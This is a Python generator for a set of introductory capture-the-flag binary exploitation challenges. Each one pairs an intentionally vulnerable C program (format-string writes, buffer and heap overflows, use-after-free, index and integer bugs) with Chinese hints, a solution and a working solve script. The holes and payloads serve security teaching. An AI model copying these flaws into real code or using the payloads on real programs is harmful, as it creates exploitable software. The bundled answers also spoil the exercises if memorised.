from __future__ import annotations

from .helpers import *
from .models import BuildResult, Target

def build_pwn_format_string_write(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        int auth = 0;
        void win(void) {{ puts("{flag}"); }}
        int main(void) {{
            char buf[256] = {{0}};
            if (!fgets(buf, sizeof(buf), stdin)) return 1;
            printf(buf, &auth);
            if (auth == 66) win();
            else puts("bye");
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="附件是一份本地 ELF，格式化字符串漏洞已经把关键指针作为参数传进了 `printf`。",
        steps=["分析 `printf` 调用点。", "构造 `%n` 写入让认证值变成 66。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

这题不需要找地址，只要利用传入的第一个指针参数即可。`%66c%1$n` 会把已经输出的字符数 66 写进 `auth`，随后程序进入 win 打印 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    proc = subprocess.run([binary], input="%66c%1$n\\n", text=True, capture_output=True)
    for line in proc.stdout.splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["先看 `printf` 的第二个参数是什么。", "这是一个标准 `%n` 写入。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_function_pointer(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        #include <unistd.h>
        struct box {{ char name[32]; void (*cb)(void); }};
        void safe(void) {{ puts("safe"); }}
        void win(void) {{ puts("{flag}"); }}
        int main(void) {{
            struct box box = {{0}};
            box.cb = safe;
            read(0, box.name, 80);
            box.cb();
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="附件中的结构体把可写缓冲区和函数指针放在一起，存在直接覆盖空间。",
        steps=["定位 win 函数地址。", "溢出覆盖函数指针。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

这是典型的函数指针覆盖。`name[32]` 后面紧跟 `cb`，因此 payload 只需要 `32` 字节填充再接 `p64(win)` 即可。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    nm = subprocess.check_output(["nm", "-an", binary], text=True)
    win = int(next(line.split()[0] for line in nm.splitlines() if " win" in line), 16)
    payload = b"A" * 32 + struct.pack("<Q", win)
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["函数指针就在缓冲区后面。", "这题不需要 ROP。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_struct_auth(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        #include <unistd.h>
        struct profile {{ char name[24]; int approved; }};
        int main(void) {{
            struct profile p = {{0}};
            read(0, p.name, 40);
            if (p.approved == 0x1337) puts("{flag}");
            else puts("nope");
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="相邻结构体字段里有一个认证位，输入读取长度明显越过了名称缓冲区。",
        steps=["确认关键字段偏移。", "用溢出把认证值改成 0x1337。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

结构体里 `name[24]` 后面就是 `approved`。payload 用 24 字节填充，再接 `p32(0x1337)` 即可。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    payload = b"A" * 24 + struct.pack("<I", 0x1337)
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["这是相邻字段覆盖，不是返回地址覆盖。", "看清偏移就够了。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_signed_index(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        struct ctx {{ char secret[64]; char items[8][8]; }};
        int main(void) {{
            struct ctx c = {{0}};
            snprintf(c.secret, sizeof(c.secret), "{flag}");
            for (int i = 0; i < 8; ++i) snprintf(c.items[i], sizeof(c.items[i]), "slot%d", i);
            int idx;
            if (scanf("%d", &idx) != 1) return 1;
            if (idx < 8) puts(c.items[idx]);
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="程序只校验了上界，没有校验下界，负索引能直接读到数组前面的敏感区。",
        steps=["推算负索引和前置 secret 的距离。", "构造负索引。", "读取并提交 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

`items` 前面正好是 `secret[64]`，每个槽位 8 字节，所以 `items[-8]` 就会指向 secret 起始地址，直接打印出 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    proc = subprocess.run([binary], input="-8\\n", text=True, capture_output=True)
    for line in proc.stdout.splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["只校验 `idx < 8` 往往意味着下界没收口。", "先算一个槽位占多少字节。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_integer_wrap(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        int main(void) {{
            unsigned short v = 0;
            unsigned int tmp = 0;
            if (scanf("%u", &tmp) != 1) return 1;
            v = (unsigned short)tmp;
            if ((unsigned short)(v + 10) < 5) puts("{flag}");
            else puts("nope");
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="程序把大整数收缩成 `unsigned short` 后又继续做算术判断，存在明显绕回空间。",
        steps=["确认截断和加法的位宽。", "构造能让 `(v+10)` 绕回到很小值的输入。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

把输入收缩到 `unsigned short` 后再做 `(v + 10)`。取 `65530` 时加 10 会绕回成 `4`，满足 `< 5`，程序直接打印 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    proc = subprocess.run([binary], input="65530\\n", text=True, capture_output=True)
    for line in proc.stdout.splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["先确认发生了哪一步截断。", "绕回后的比较值其实很小。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_off_by_one(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        #include <unistd.h>
        struct ctx {{ char name[16]; unsigned char admin; }};
        int main(void) {{
            struct ctx c = {{0}};
            read(0, c.name, 17);
            if (c.admin == 1) puts("{flag}");
            else puts("nope");
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="程序只多读了一个字节，但那个字节正好能碰到认证标志位。",
        steps=["确认 off-by-one 命中的字段。", "构造 17 字节输入把 admin 改成 1。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

`name[16]` 后面紧跟一个 `unsigned char admin`。发送 `16` 个填充字节再接 `\\x01`，就能用单字节越界把 admin 改成 1。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    payload = b"A" * 16 + b"\\x01"
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["不是所有 off-by-one 都要拿 shell。", "看看 17 字节刚好落在什么位置。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_uaf(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        struct note {{ char name[32]; void (*cb)(void); }};
        struct note *note = NULL;
        char *comment = NULL;
        void safe(void) {{ puts("safe"); }}
        void win(void) {{ puts("{flag}"); }}

        int main(void) {{
            int choice;
            while (scanf("%d", &choice) == 1) {{
                if (choice == 1) {{
                    note = malloc(sizeof(struct note));
                    memset(note, 0, sizeof(struct note));
                    note->cb = safe;
                }} else if (choice == 2) {{
                    free(note);
                }} else if (choice == 3) {{
                    comment = malloc(sizeof(struct note));
                    fread(comment, 1, sizeof(struct note), stdin);
                }} else if (choice == 4) {{
                    note->cb();
                    break;
                }}
            }}
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="这是一个最小 UAF 场景：释放后的 note 指针没有清空，后续同尺寸分配会复用同一块堆区。",
        steps=["确认释放后对象还能被调用。", "用下一次同尺寸分配覆盖回调指针。", "触发回调并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

先申请 note，再 free，但全局指针没清空。下一次申请同尺寸 comment 时会复用同一块堆，写入 `32` 字节填充加 `p64(win)` 后，再触发旧指针上的回调即可。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    nm = subprocess.check_output(["nm", "-an", binary], text=True)
    win = int(next(line.split()[0] for line in nm.splitlines() if " win" in line), 16)
    payload = b"1\\n2\\n3" + b"A" * 32 + struct.pack("<Q", win) + b"4\\n"
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["先看 free 后指针是否清空。", "同尺寸堆块复用是这题的关键。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_heap_adjacent(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>
        struct item {{ char title[16]; void (*cb)(void); }};
        void safe(void) {{ puts("safe"); }}
        void win(void) {{ puts("{flag}"); }}
        int main(void) {{
            char *buf = malloc(16);
            struct item *it = malloc(sizeof(struct item));
            it->cb = safe;
            read(0, buf, 64);
            it->cb();
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="两个堆对象连续分配，前一个缓冲区的读取长度足以越过边界打到后一个对象。",
        steps=["定位相邻对象布局。", "溢出覆盖后一个对象的回调指针。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

这是入门型相邻堆对象覆盖。前 32 字节占满第一个堆块，继续写就会打到第二个对象，把回调指针改成 win 即可。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    nm = subprocess.check_output(["nm", "-an", binary], text=True)
    win = int(next(line.split()[0] for line in nm.splitlines() if " win" in line), 16)
    payload = b"A" * 48 + struct.pack("<Q", win)
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["先算第一个堆块能写多少，再算第二个对象头。", "覆盖目标仍然是回调指针。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_partial_pointer(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        #include <unistd.h>
        struct box {{ char buf[24]; void (*cb)(void); }};
        void safe(void) {{ puts("safe"); }}
        void win(void) {{ puts("{flag}"); }}
        int main(void) {{
            struct box box = {{0}};
            box.cb = safe;
            read(0, box.buf, 25);
            box.cb();
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="这里只能多写一个字节，但函数指针和目标函数位于同一页，低字节足够改变控制流。",
        steps=["比较 safe 和 win 的地址低字节。", "用 1 字节覆盖把指针拨到 win。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

`read` 只比缓冲区多写 1 个字节，所以能改的只有函数指针最低字节。由于 `safe` 和 `win` 的高位地址一致，改低字节就足够跳到 win。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    nm = subprocess.check_output(["nm", "-an", binary], text=True)
    safe = int(next(line.split()[0] for line in nm.splitlines() if " safe" in line), 16)
    win = int(next(line.split()[0] for line in nm.splitlines() if " win" in line), 16)
    if safe >> 8 != win >> 8:
        raise SystemExit("unexpected address layout")
    payload = b"A" * 24 + bytes([win & 0xFF])
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["只改 1 字节意味着要先看高位是否相同。", "safe 和 win 离得很近。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )

def build_pwn_table_index(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    source = textwrap.dedent(
        f"""\
        #include <stdio.h>
        struct state {{ unsigned long slots[4]; unsigned long target; }};
        void safe(void) {{ puts("safe"); }}
        void win(void) {{ puts("{flag}"); }}
        int main(void) {{
            struct state st = {{0}};
            unsigned idx;
            unsigned long value;
            st.target = (unsigned long)safe;
            if (scanf("%u %lx", &idx, &value) != 2) return 1;
            if (idx < 8) st.slots[idx] = value;
            ((void (*)(void))st.target)();
            return 0;
        }}
        """
    )
    with tempfile.TemporaryDirectory() as tmp_dir:
        bin_path = Path(tmp_dir) / "challenge.bin"
        compile_pwn_c(source, bin_path)
        binary = bin_path.read_bytes()
    statement = plain_statement(
        intro="程序把函数地址放在了数组后面，但索引上界放宽到了 8，足够把数组后的目标位改掉。",
        steps=["确认数组和 target 的相对布局。", "用越界索引写入 win 地址。", "运行程序并读取 flag。"],
        attachments=["challenge.bin"],
    )
    solution = """# 解法

`slots[4]` 后面紧接着 `target`，因此写 `idx=4` 就会越界改到 target。把它写成 win 地址后，程序末尾调用 target 时就会打印 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    nm = subprocess.check_output(["nm", "-an", binary], text=True)
    win = int(next(line.split()[0] for line in nm.splitlines() if " win" in line), 16)
    proc = subprocess.run([binary], input=f"4 {win:x}\\n", text=True, capture_output=True)
    for line in proc.stdout.splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
"""
    return BuildResult(
        statement=statement,
        solution=solution,
        solve_py=solve_py,
        hints=["数组后面的字段同样会被越界索引命中。", "想想 `idx=4` 会写到哪里。"],
        files={"attachments/challenge.bin": binary},
        attachments=[("attachments/challenge.bin", "challenge.bin")],
        flag_type="static",
        flag_value=flag,
    )
